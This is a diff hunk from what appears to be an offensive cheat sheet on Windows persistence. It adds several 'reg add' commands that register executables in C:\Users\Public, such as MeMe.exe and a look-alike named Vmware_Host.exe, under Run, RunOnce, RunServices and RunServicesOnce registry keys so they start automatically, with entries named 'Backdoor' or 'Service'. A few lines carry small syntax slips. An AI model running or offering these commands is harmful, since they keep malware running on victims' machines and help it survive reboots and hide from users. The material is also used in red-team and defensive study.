@@ -21,7 +21,15 @@ reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v Backd
 ```
 #Elevated AutoRun Persistence:
 
-reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v Backdoor /t REG_SZ /d C:\Users\Public\meme.exe
+reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run" /v Service /t REG_SZ /d "C:\Users\Public\MeMe.exe"
+
+reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce" /v Service /t REG_SZ /d "C:\Users\Public\MeMe.exe"
+
+reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices" /v Service /t REG_SZ /d "C:\Users\Public\MeMe.exe"
+
+reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce" /v Service /t REG_SZ /d"C:\Users\Public\MeMe.exe"
+
+reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v Backdoor/t REG_SZ /d C:\Users\Public\meme.exe
 
 reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v Backdoor /t REG_SZ /d C:\Users\Public\Vmware_Host.exe
 
